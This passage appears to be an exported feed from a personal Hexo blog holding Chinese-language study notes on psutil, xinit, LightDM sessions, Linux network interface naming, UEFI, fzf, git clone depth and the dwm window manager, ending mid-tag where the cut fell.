    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo new <span class="hljs-string">&quot;My New Post&quot;</span><br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo server<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo generate<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo deploy<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2022/09/04/psutil-%E5%BA%93%E7%9A%84%E4%BD%BF%E7%94%A8/"/>
    <url>/2022/09/04/psutil-%E5%BA%93%E7%9A%84%E4%BD%BF%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<p>import psutil</p><h1 id="获取完整信息"><a href="#获取完整信息" class="headerlink" title="获取完整信息"></a>获取完整信息</h1><p>print(psutil.cpu_times())</p><h1 id="获取-CPU-逻辑个数"><a href="#获取-CPU-逻辑个数" class="headerlink" title="获取 CPU 逻辑个数"></a>获取 CPU 逻辑个数</h1><p>print(psutil.cpu_count())</p><h1 id="获取-CPU-物理个数"><a href="#获取-CPU-物理个数" class="headerlink" title="获取 CPU 物理个数"></a>获取 CPU 物理个数</h1><p>print(psutil.cpu_count(logical&#x3D;False))</p><h1 id="获取-CPU-使用率，其有两个参数，前者为-interval-指定计算-CPU-使用率的时间间隔"><a href="#获取-CPU-使用率，其有两个参数，前者为-interval-指定计算-CPU-使用率的时间间隔" class="headerlink" title="获取 CPU 使用率，其有两个参数，前者为 interval, 指定计算 CPU 使用率的时间间隔"></a>获取 CPU 使用率，其有两个参数，前者为 interval, 指定计算 CPU 使用率的时间间隔</h1><h1 id="后者-percpu-指定需要总的使用率还是每个-CPU-的使用率"><a href="#后者-percpu-指定需要总的使用率还是每个-CPU-的使用率" class="headerlink" title="后者 percpu 指定需要总的使用率还是每个 CPU 的使用率"></a>后者 percpu 指定需要总的使用率还是每个 CPU 的使用率</h1><p>for _ in range(10):<br>    print(psutil.cpu_percent(interval&#x3D;1))<br>    print(psutil.cpu_percent(interval&#x3D;1, percpu&#x3D;Ture))</p><h1 id="获取内存的使用情况"><a href="#获取内存的使用情况" class="headerlink" title="获取内存的使用情况"></a>获取内存的使用情况</h1><p>print(psutil.virtual_memory())</p><h1 id="获取系统交换内存的统计信息"><a href="#获取系统交换内存的统计信息" class="headerlink" title="获取系统交换内存的统计信息"></a>获取系统交换内存的统计信息</h1><p>print(psutil.swap_memory())</p><h1 id="获取磁盘分区的信息"><a href="#获取磁盘分区的信息" class="headerlink" title="获取磁盘分区的信息"></a>获取磁盘分区的信息</h1><p>print(psutil.disk_partitions)</p><h1 id="获取磁盘的使用情况"><a href="#获取磁盘的使用情况" class="headerlink" title="获取磁盘的使用情况"></a>获取磁盘的使用情况</h1><p>print(psutil.disk_usage(‘&#x2F;‘))</p><h1 id="获取磁盘的-IO-统计信息-读写速度等"><a href="#获取磁盘的-IO-统计信息-读写速度等" class="headerlink" title="获取磁盘的 IO 统计信息(读写速度等)"></a>获取磁盘的 IO 统计信息(读写速度等)</h1><p>print(psutil.disk_io_counters())</p><h1 id="获取网络信息"><a href="#获取网络信息" class="headerlink" title="获取网络信息"></a>获取网络信息</h1><h1 id="获取总的网络-IO-信息"><a href="#获取总的网络-IO-信息" class="headerlink" title="获取总的网络 IO 信息"></a>获取总的网络 IO 信息</h1><p>print(psutil.net_io_counters())</p><h1 id="获取网卡的-IO-信息"><a href="#获取网卡的-IO-信息" class="headerlink" title="获取网卡的 IO 信息"></a>获取网卡的 IO 信息</h1><p>print(psutil.net_io_counters(pernic&#x3D;Ture))</p><h1 id="获取网络接口信息"><a href="#获取网络接口信息" class="headerlink" title="获取网络接口信息"></a>获取网络接口信息</h1><p>print(psutil.net_if_addrs())</p><h1 id="获取网络接口状态信息"><a href="#获取网络接口状态信息" class="headerlink" title="获取网络接口状态信息"></a>获取网络接口状态信息</h1><p>print(psutil.net_if_stats())</p><h1 id="获取其他系统信息"><a href="#获取其他系统信息" class="headerlink" title="获取其他系统信息"></a>获取其他系统信息</h1><h1 id="获取系统开机的时间"><a href="#获取系统开机的时间" class="headerlink" title="获取系统开机的时间,"></a>获取系统开机的时间,</h1><p>print(psutil.boot_time())</p><h1 id="获取连接系统的用户列表"><a href="#获取连接系统的用户列表" class="headerlink" title="获取连接系统的用户列表"></a>获取连接系统的用户列表</h1><p>print(psutil.users())</p><h1 id="获取系统全部的进程信息"><a href="#获取系统全部的进程信息" class="headerlink" title="获取系统全部的进程信息"></a>获取系统全部的进程信息</h1><p>print(psutil.pids())</p><h1 id="获取单个进程的信息，获取指定进程-ID-x3D-100"><a href="#获取单个进程的信息，获取指定进程-ID-x3D-100" class="headerlink" title="获取单个进程的信息，获取指定进程 ID&#x3D;100"></a>获取单个进程的信息，获取指定进程 ID&#x3D;100</h1><p>print(psutil.Process(100))</p><h1 id="模拟-ps-命令效果"><a href="#模拟-ps-命令效果" class="headerlink" title="模拟 ps 命令效果"></a>模拟 ps 命令效果</h1><p>print(psutil.test())</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>ArchWiki 中 xinit 部分</title>
    <link href="/2022/09/04/ArchWiki-%E4%B8%AD-xinit-%E9%83%A8%E5%88%86/"/>
    <url>/2022/09/04/ArchWiki-%E4%B8%AD-xinit-%E9%83%A8%E5%88%86/</url>
    
    <content type="html"><![CDATA[<p><a href="https://wiki.archlinux.org.title/Xinit">ArchWiki 中 xinit 部分</a><br>xinit 程序允许用户手动启动 Xorg 显示服务器。</p><p>startx 脚本是 xinit 的一个前端。</p><p>xinit 通常用于启动窗口管理器或桌面环境.</p><h1 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h1><p>xinit 和 startx 需要一个可选的客户端程序参数，如果没有提供参数，它们会2寻找 <code>~/.xinitrc</code> 作为一个 shell 脚本运行。</p><h2 id="xinitrc"><a href="#xinitrc" class="headerlink" title="xinitrc"></a>xinitrc</h2><p><code>~/.xinitrc</code> 如果存在于用户的主目录中，startx 和 xinit 会执行它, 否则，startx 将运行默认的 <code>/etc/X11/xinit/xinitrc</code>.</p><p>这个默认的 xinitrc 将启动一个包含 Twm, xorg-xclock 和 Xterm 的基本环境，要启动不同的窗口管理器或桌面环境，首先要在主目录下创建一个默认的 <code>xinitrc</code> 副本.</p><p>注意 <code>exec</code> 后面的行将会被忽略，因此其他的东西应该放在 <code>exec</code> 这行命令之前.</p><p>在窗口管理器之前启动的长期运行的程序，如屏保和墙纸程序，必须使用 <code>&amp;</code> 放入后台运行，否则，在执行窗口管理器或桌面环境之前，脚本会停止运行并等待每个程序退出.</p><h2 id="登录时自动启动-X"><a href="#登录时自动启动-X" class="headerlink" title="登录时自动启动 X"></a>登录时自动启动 X</h2><p>在 login shell 初始化文件，如 Bash 的 <code>~/.bash_profile</code> 或 Zsh 的 <code>~/.zprofile</code> 中放置:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">if</span> [ -z <span class="hljs-string">&quot;<span class="hljs-variable">$&#123;DISPLAY&#125;</span>&quot;</span> ] &amp;&amp; [ <span class="hljs-string">&quot;<span class="hljs-variable">$&#123;XDG_VTNR&#125;</span>&quot;</span> -eq 1 ]; <span class="hljs-keyword">then</span><br>  <span class="hljs-built_in">exec</span> startx<br><span class="hljs-keyword">fi</span><br></code></pre></td></tr></table></figure><h2 id="在没有窗口管理器的情况下启动应用程序"><a href="#在没有窗口管理器的情况下启动应用程序" class="headerlink" title="在没有窗口管理器的情况下启动应用程序"></a>在没有窗口管理器的情况下启动应用程序</h2><p>如:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># ~/.xinitrc</span><br><br>...<br><br><span class="hljs-built_in">exec</span> chromium<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Arch</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>解决使用 lightdm 登入 Arch 后未打开 dwm 问题</title>
    <link href="/2022/09/04/%E8%A7%A3%E5%86%B3%E4%BD%BF%E7%94%A8-lightdm-%E7%99%BB%E5%85%A5-Arch-%E5%90%8E%E6%9C%AA%E6%89%93%E5%BC%80-dwm-%E9%97%AE%E9%A2%98/"/>
    <url>/2022/09/04/%E8%A7%A3%E5%86%B3%E4%BD%BF%E7%94%A8-lightdm-%E7%99%BB%E5%85%A5-Arch-%E5%90%8E%E6%9C%AA%E6%89%93%E5%BC%80-dwm-%E9%97%AE%E9%A2%98/</url>
    
    <content type="html"><![CDATA[<p><a href="https://wiki.archlinux.org/title/Display_Manager">ArckWiki DM 部分</a></p><h1 id="Display-Manager"><a href="#Display-Manager" class="headerlink" title="Display Manager"></a>Display Manager</h1><p>Display Manager 通常是一个在启动过程结束时，代替默认 shell 显示图形用户界面.</p><h1 id="Greeter"><a href="#Greeter" class="headerlink" title="Greeter"></a>Greeter</h1><p>greeter 是提示用户输入密码的 GUI 界面，如果配置了自动登录，可以不使用 greeter. 默认配置使用的是 <code>lightdm-gtk-greeter</code>.</p><p>可以通过更改配置文件中的 <code>[Seat:*]</code> 部分来设置 greeter.</p><p>可以通过 <code>ls -l /usr/share/xgreeters/</code> 来获取 greeter 的可用选项.</p><h1 id="会话配置"><a href="#会话配置" class="headerlink" title="会话配置"></a>会话配置</h1><p>会话，即在 greeter 输入密码账号后即将进入的程序，一般为 Window Manager 或桌面.</p><p>多数显示管理器会读取 <code>/usr/share/xsessions</code> 目录获取可用的会话列表，此目录中包含各个标准的桌面文件。</p><p>要建立会话，可以在 <code>/usr/share/xsessions</code> 中新建 <code>.desktop</code> 后缀的文件.</p><p>格式 (以我自己 Ubuntu 上的 gnome.desktop) 为例:</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-section">[Desktop Entry]</span><br><span class="hljs-attr">Name</span>=GNOME<br><span class="hljs-attr">Comment</span>=This session logs you into GNOME<br><span class="hljs-attr">Exec</span>=/usr/bin/gnome-session --session=gnome<br><span class="hljs-attr">TryExec</span>=/usr/bin/gnome-session<br><span class="hljs-attr">Type</span>=Application<br><span class="hljs-attr">DesktopNames</span>=GNOME<br><span class="hljs-attr">X-GDM-SessionRegisters</span>=<span class="hljs-literal">true</span><br><span class="hljs-attr">X-Ubuntu-Gettext-Domain</span>=gnome-session-<span class="hljs-number">42</span><br></code></pre></td></tr></table></figure><p>里面的 <code>gnome-session</code> 是一个 shell 脚本.</p><h1 id="运行-xinitrc-会话"><a href="#运行-xinitrc-会话" class="headerlink" title="运行 ~/.xinitrc 会话"></a>运行 <code>~/.xinitrc</code> 会话</h1><p>需要安装 <code>xinit-xsession</code> 后，在显示管理器中提供一个运行 xinitrc 会话的选项，需确保 <code>~/.xinitrc</code> 可执行，然后再显示管理器中选择 <code>xinitrc</code> 作为会话.</p><h1 id="没有窗口管理器启动应用程序"><a href="#没有窗口管理器启动应用程序" class="headerlink" title="没有窗口管理器启动应用程序"></a>没有窗口管理器启动应用程序</h1><p>可以在没有窗口修饰，桌面或窗口管理器的情况下启动应用程序。</p><p>如，要启动 <code>google-chrome</code>，在 <code>/usr/share/xsessions/</code> 中创建 <code>web-browser.desktop</code>:</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-section">[Desktop Entry]</span><br><span class="hljs-attr">Name</span>=Web Browser<br><span class="hljs-attr">Comment</span>=Use a web browser as your session<br><span class="hljs-attr">Exec</span>=/usr/bin/google-chrone --auto-launch-at-startup<br><span class="hljs-attr">TryExec</span>=/usr/bin/google-chrone --auto-launch-at-startup<br><span class="hljs-attr">Icon</span>=google-chrome<br><span class="hljs-attr">Type</span>=Application<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Arch</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>查看 Linux 下的网卡信息</title>
    <link href="/2022/09/03/%E6%9F%A5%E7%9C%8B-Linux-%E4%B8%8B%E7%9A%84%E7%BD%91%E5%8D%A1%E4%BF%A1%E6%81%AF/"/>
    <url>/2022/09/03/%E6%9F%A5%E7%9C%8B-Linux-%E4%B8%8B%E7%9A%84%E7%BD%91%E5%8D%A1%E4%BF%A1%E6%81%AF/</url>
    
    <content type="html"><![CDATA[<p><a href="https://wiki.archlinux.org/title/Systemd-networkd">ArchWiki</a><br>systemd-networkd 是一个管理网络配置的系统守护进程.</p><h1 id="查看网络设备"><a href="#查看网络设备" class="headerlink" title="查看网络设备"></a>查看网络设备</h1><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle">ls <span class="hljs-regexp">/sys/</span><span class="hljs-keyword">class</span>/net<br></code></pre></td></tr></table></figure><h1 id="基本用法"><a href="#基本用法" class="headerlink" title="基本用法"></a>基本用法</h1><p>systemd 是 Arch 安装的一部分，包含操作有线网络所需的所有文件，无线适配器可以通过其他服务(如 wpa_supplicant 或 iwd) 来配置.</p><p>通过 <code>ifconfig</code> 显示的设备中:</p><p><code>enp7s0</code> 是当前实机的网卡.</p><p><code>enpls0</code> 是有线适配器.</p><p><code>wlp2s0</code> 是无线适配器.</p><h1 id="NCI"><a href="#NCI" class="headerlink" title="NCI"></a>NCI</h1><p>NIC 为 Network Interface Controler, 网络接口控制器。又称网络适配器 (network adapter), 网卡 (netword card), 或局域网接收器 (LAN adapter).</p><p>其是一块被设计用来允许计算机在计算机网络上进行通讯的计算机硬件.</p><p>每个网卡都有一个被称为 MAC 地址的独一无二的 48 位串行号，被写在卡的一块 ROM 中.</p><p>网卡以前是作为扩展卡插到计算机总线上的，现在大部分新的计算机都在主板上集成了网络接口，这些主板或是在主板芯片中集成了以太网的功能，或是使用一块通过 PCI 连接到主板上的廉价网卡.</p><h1 id="网卡名称的变迁"><a href="#网卡名称的变迁" class="headerlink" title="网卡名称的变迁"></a>网卡名称的变迁</h1><p><a href="https://www.freeaihub.com/post/104299.html">参考</a><br>一开始，Linux 的网卡名称为 eth0, wlan0. 现在变为了 enp7s0, wlp6s0.</p><h2 id="eth0-wlan0-的含义"><a href="#eth0-wlan0-的含义" class="headerlink" title="eth0, wlan0 的含义"></a>eth0, wlan0 的含义</h2><p>eth0 是系统自动选择的网络设备名称，来自 ethernet.</p><p>无线网卡就是 wlan, 来自 Wireless LAN.</p><p>lo 为 Loopback.</p><p>tun 为 Tunnel.</p><p>br 为 Bridge.</p><h2 id="enp7s0-wlp60-的含义"><a href="#enp7s0-wlp60-的含义" class="headerlink" title="enp7s0, wlp60 的含义"></a>enp7s0, wlp60 的含义</h2><p>enp7s0 中 en 代表 ethernet, wlp60 中 wl 代表 wireless.</p><p>pXsY (X, Y 是整数值) 代表 PCI 的位置。</p><h1 id="virbr"><a href="#virbr" class="headerlink" title="virbr"></a>virbr</h1><p>virbr0 (Virtual network switch) 是一种虚拟网络接口，这是由于安装和启用了 libvirt 服务后生成的，libvirt 在服务器 (host) 上生成一个 virbr0, host 上所有虚拟机 (guests) 通过这个 virbr0 连起来. 默认情况下, virbr0 使用的是 NAT 模式 (采用 IP Masquerade).</p><h1 id="NAT"><a href="#NAT" class="headerlink" title="NAT"></a>NAT</h1><p>NAT 是 Network Address Translation, 网络地址转换</p><p>当专用网内部的主机分配了本地的 IP 地址 (即仅在本专用网内使用的专用地址), 但又想和因特网上的主机通信, 通常使用 NAT.</p><h1 id="PCI-总线"><a href="#PCI-总线" class="headerlink" title="PCI 总线"></a>PCI 总线</h1><p>PCI 是 Peripheral Component Interconnect(外设部件互联标准) 的缩写。其为个人电脑使用最广泛的接口. 几乎所有的主板产品上都带有这种插槽。PCI 插槽也是主板带有最多数量的插槽类型。</p><p>从结构上看，PCI 是在 CPU 的供应商和原来的系统总线之间插入的一级总线，具体由一个桥接电路实现对这一层的管理，并实现上下之间的接口以协调数据的传输.</p>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>机器人学习小纲要</title>
    <link href="/2022/09/03/%E6%9C%BA%E5%99%A8%E4%BA%BA%E5%AD%A6%E4%B9%A0%E5%B0%8F%E7%BA%B2%E8%A6%81/"/>
    <url>/2022/09/03/%E6%9C%BA%E5%99%A8%E4%BA%BA%E5%AD%A6%E4%B9%A0%E5%B0%8F%E7%BA%B2%E8%A6%81/</url>
    
    <content type="html"><![CDATA[<h1 id="线性代数"><a href="#线性代数" class="headerlink" title="线性代数"></a>线性代数</h1><p>线性代数书:</p><ul><li>《Linear Algebra Done Right》</li><li>《Linear Algebra Done Wrong》<br><a href="https://www.math.brown.edu/~treil/papers/LADW/book.pdf">线代书</a></li></ul><h1 id="makefile"><a href="#makefile" class="headerlink" title="makefile"></a>makefile</h1><p>博文: Makefile详解(超级好)_mingw</p><h1 id="Javascript-和-HTML-学习"><a href="#Javascript-和-HTML-学习" class="headerlink" title="Javascript 和 HTML 学习"></a>Javascript 和 HTML 学习</h1><p><a href="http://www.w3schools.com/">资料</a><br>网站左侧的 “Learn HTML”、”Learn CSS”、”Learn Javascript”、”Learn JQuery”.</p><p>网站: three.js、examples</p><p>PHP</p><p>一本书: 《数学之美》</p><h1 id="硬件"><a href="#硬件" class="headerlink" title="硬件"></a>硬件</h1><p>Solidworks 画基本的机械图.</p><p>Altium Designer 作图.</p><p>开发套件: Arduino STEM educational Robot kits Building Platform.</p>]]></content>
    
    
    <categories>
      
      <category>Python</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>关于多系统安装</title>
    <link href="/2022/09/03/%E5%85%B3%E4%BA%8E%E5%A4%9A%E7%B3%BB%E7%BB%9F%E5%AE%89%E8%A3%85/"/>
    <url>/2022/09/03/%E5%85%B3%E4%BA%8E%E5%A4%9A%E7%B3%BB%E7%BB%9F%E5%AE%89%E8%A3%85/</url>
    
    <content type="html"><![CDATA[<p>删除一个双系统之中的一个系统，直接格式化分区也问题不大，只是启动时引导还在.</p>]]></content>
    
    
    <categories>
      
      <category>Skills</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ArchWiki 中 XFS 部分</title>
    <link href="/2022/09/03/ArchWiki-%E4%B8%AD-XFS-%E9%83%A8%E5%88%86/"/>
    <url>/2022/09/03/ArchWiki-%E4%B8%AD-XFS-%E9%83%A8%E5%88%86/</url>
    
    <content type="html"><![CDATA[<p><a href="https://wiki.archlinux.org/title/XFS">ArchWiki XFS 部分</a><br>XFS 是高新能日志式文件系统.</p>]]></content>
    
    
    <categories>
      
      <category>Arch</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ArchWiki 中 UEFI 部分</title>
    <link href="/2022/09/03/ArchWiki-%E4%B8%AD-UEFI-%E9%83%A8%E5%88%86/"/>
    <url>/2022/09/03/ArchWiki-%E4%B8%AD-UEFI-%E9%83%A8%E5%88%86/</url>
    
    <content type="html"><![CDATA[<p><a href="https://wiki.archlinux.org/title/Unified_Extensible_Firmware_Interface">ArchWiki</a><br>UEFI 是 Unified Extensible Firmware Interface, 统一可扩展固件接口, 是操作系统和固件之间接口的模型。UEFI 提供了启动操作系统或预启动程序的标准环境.</p><h1 id="Arch-boot-process"><a href="#Arch-boot-process" class="headerlink" title="Arch boot process"></a>Arch boot process</h1><p><a href="https://wiki.archlinux.org/title/Arch_boot_process">ArchWiki中相关部分</a></p><h2 id="固件类型"><a href="#固件类型" class="headerlink" title="固件类型"></a>固件类型</h2><p>固件是开机时最先执行的程序。</p><h3 id="BIOS"><a href="#BIOS" class="headerlink" title="BIOS"></a>BIOS</h3><p>Basic Input-Output System, 是系统开启时最先运行的程序 (固件), 大多数情况存储在主板本身的一块闪存内，独立于其他系统存储。</p><p>其分区受限制, 在 2010 年起逐渐被 UEFI 替换.</p><h3 id="UEFI"><a href="#UEFI" class="headerlink" title="UEFI"></a>UEFI</h3><p>其不从主引导记录 (MBR) 中启动任何引导代码.</p><p>UEFI 启动过程依赖<mark>非易失性随机访问存储器</mark> (NVRAM)</p><p>UEFI 会启动 EFI 应用程序，例如 boot loader, bootmanager 和 UEFI Shell等。这些程序通常以文件形式存储在 EFI 系统分区中. 厂商可以将其特定文件存储在 <code>EFI</code> 系统分区的 <code>/EFI/vendor_name</code> 文件夹下.</p><p>UEFI 规范通过 Compatibility Support Module, CSM, 来支持 BIOS 引导.</p><h4 id="NVRAM"><a href="#NVRAM" class="headerlink" title="NVRAM"></a>NVRAM</h4><p>其全称为 Non-volatile random-access memory.</p><p>它可以在断电时仍然保存其中的数据.</p><p>而 DRAM (dynammic random-access memory) 和 SRAM (static random-access memory) 都需要在连接电源的情况下.</p><p>Read-only memory device 可以用作存储 system firmware in 嵌入式系统。它们可以保存 initial processor instructions required to bootstrap a computer system.</p><h2 id="系统初始化"><a href="#系统初始化" class="headerlink" title="系统初始化."></a>系统初始化.</h2><p>系统开启后，会先执行加电自检 (Power-on self-test, POST). 具体见官网。</p><h2 id="引导加载程序"><a href="#引导加载程序" class="headerlink" title="引导加载程序"></a>引导加载程序</h2><p>Boot loader. 是由计算机固件 (BIOS 或 UEFI) 启动的软件。它负责用想要的内核参数加载内核，并根据配置文件初始化 RAM 磁盘.</p><p>文件系统支持是从固件继承的。UEFI 规范要求支持 FAT12, FAT16 和 FAT32 文件系统.</p><p><code>.efi</code> 就是 EFI 应用程序.</p><h2 id="内核"><a href="#内核" class="headerlink" title="内核"></a>内核</h2><p>内核是操作系统的核心。它运行于一个叫 “内核空间” 的底层上，负责机器硬件和应用程序之间的交流。</p><h1 id="UEFI-1"><a href="#UEFI-1" class="headerlink" title="UEFI"></a>UEFI</h1><h2 id="UEFI-固件架构"><a href="#UEFI-固件架构" class="headerlink" title="UEFI 固件架构"></a>UEFI 固件架构</h2><p>UEFI 下的每一个程序，无论它是某个 OS 引导其还是某个内存测试或数据恢复工具，都要兼容于 EFI 固件位数或体系结构。</p><p>目前主流的 UEFI 固件都采用 x86_64 EFI 固件。</p><p>x86_64 EFI 不能兼容 32 位 EFI 程序.</p><p>查看 UEFI 系统位数:</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">$ cat <span class="hljs-regexp">/sys/</span>firmware<span class="hljs-regexp">/efi/</span>fw_platform_size<br></code></pre></td></tr></table></figure><h2 id="UEFI-变量"><a href="#UEFI-变量" class="headerlink" title="UEFI 变量"></a>UEFI 变量</h2><p>获取变量列表:</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crystal"><span class="hljs-variable">$ </span>efivar -l<br></code></pre></td></tr></table></figure><h3 id="用户空间工具"><a href="#用户空间工具" class="headerlink" title="用户空间工具"></a>用户空间工具</h3><h4 id="efibootmgr"><a href="#efibootmgr" class="headerlink" title="efibootmgr"></a>efibootmgr</h4><h2 id="UEFI-Shell"><a href="#UEFI-Shell" class="headerlink" title="UEFI Shell"></a>UEFI Shell</h2><p>UEFI Shell 是固件的终端，可用于启动包括引导器的 UEFI 程序.</p><p>也可用于采集固件和系统的各种信息.</p>]]></content>
    
    
    <categories>
      
      <category>Arch</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>fzf 工具的安装和使用</title>
    <link href="/2022/09/03/fzf-%E5%B7%A5%E5%85%B7%E7%9A%84%E5%AE%89%E8%A3%85%E5%92%8C%E4%BD%BF%E7%94%A8/"/>
    <url>/2022/09/03/fzf-%E5%B7%A5%E5%85%B7%E7%9A%84%E5%AE%89%E8%A3%85%E5%92%8C%E4%BD%BF%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<p><a href="https://github.com/junegunn/fzf">github 相关内容</a><br>fzf 是 fuzzy finder 的简称。</p><p>用于在命令行下查找文件, 目录等。</p><p>注意在下载后： Key bindings (CREL-T&#x2F;CREL-R&#x2F;CREL-C) and fuzzy auto-completion may not be enabled by default.</p><h1 id="Usage"><a href="#Usage" class="headerlink" title="Usage"></a>Usage</h1><p>使用几个快捷键：</p><ul><li><code>CTRL-K</code> 和 <code>CTRL-J</code> 用于上下移动</li><li><code>Enter</code> 用于选中，<code>CTRL-C</code> 用于退出</li><li><code>-m</code> multi-select mode, 使用 <code>TAB</code> 和 <code>Shift-TAB</code> 来标记多个 items</li><li>鼠标滚轮也能移动<br>被选中的会被输出到 STDOUT 中。</li></ul><h2 id="layout"><a href="#layout" class="headerlink" title="layout"></a>layout</h2><p>可改变窗口大小，具体见 github.</p><h2 id="Search-syntax"><a href="#Search-syntax" class="headerlink" title="Search syntax"></a>Search syntax</h2><p>可以使用空格来进行层次搜索, 比如 <code>Documents/books/hello.txt</code>, 你可以在 fzf 中输入 <code>Do boo hello</code> 来查找。</p><p>用 <code>|</code> 代表 “或者”, <code>^</code> , <code>$</code> 和 <code>!</code> 都可以使用.</p><h1 id="fzf-tmux-script"><a href="#fzf-tmux-script" class="headerlink" title="fzf-tmux script"></a><code>fzf-tmux</code> script</h1><p>具体看 github, 暂时不了解。</p><h1 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h1><p><a href="https://b23.tv/qSnllig">参考</a><br>也可以在 <code>man fzf</code> 中查找信息.</p><p>几个环境变量.</p><h2 id="在-vim-中使用-fzf"><a href="#在-vim-中使用-fzf" class="headerlink" title="在 vim 中使用 fzf"></a>在 vim 中使用 fzf</h2>]]></content>
    
    
    <categories>
      
      <category>Linux</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>git clone --depth 含义</title>
    <link href="/2022/09/03/git-clone-depth-%E5%90%AB%E4%B9%89/"/>
    <url>/2022/09/03/git-clone-depth-%E5%90%AB%E4%B9%89/</url>
    
    <content type="html"><![CDATA[<p><code>git clone --depth=1</code> 意思就是克隆下载最近一次 commit 的一个分支. 这样版本项目文件就不会很大.</p>]]></content>
    
    
    <categories>
      
      <category>Git</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>窗口管理器 dwm 和 终端 st</title>
    <link href="/2022/09/03/%E7%AA%97%E5%8F%A3%E7%AE%A1%E7%90%86%E5%99%A8-dwm-%E5%92%8C-%E7%BB%88%E7%AB%AF-st/"/>
    <url>/2022/09/03/%E7%AA%97%E5%8F%A3%E7%AE%A1%E7%90%86%E5%99%A8-dwm-%E5%92%8C-%E7%BB%88%E7%AB%AF-st/</url>
    
    <content type="html"><![CDATA[<p><a href="https://suckless.org/">suckless 官网</a><br>suckless 是一个开源社区. 其是一个极简主义的爱好者.</p><h1 id="st"><a href="#st" class="headerlink" title="st"></a>st</h1><p>st 是 simple terminal.</p><h1 id="dwm"><a href="#dwm" class="headerlink" title="dwm"></a>dwm</h1><p>dwm 是 dynamic window manager, 动态窗口管理器.</p><p>dwm 是 X 下的一个动态窗口管理器.</p><h2 id="Xorg"><a href="#Xorg" class="headerlink" title="Xorg"></a>Xorg</h2><p><a href="https://wiki.archlinux.org/title/Xorg">ArchWiki</a><br>X.org 项目，其提供了 X 窗口系统的开源实现.</p><p>Xorg 简称 X, 几乎是 Linux 中图形用户程序的必备条件.</p><p>其潜在的继任者为 <code>Wayland</code>.</p><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><p>用户通常选择安装窗口管理器或桌面环境以配合使用 X.</p><p>一般为:</p><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs axapta">pacman -S xorg xorg-<span class="hljs-keyword">server</span><br></code></pre></td></tr></table></figure><h4 id="驱动安装"><a href="#驱动安装" class="headerlink" 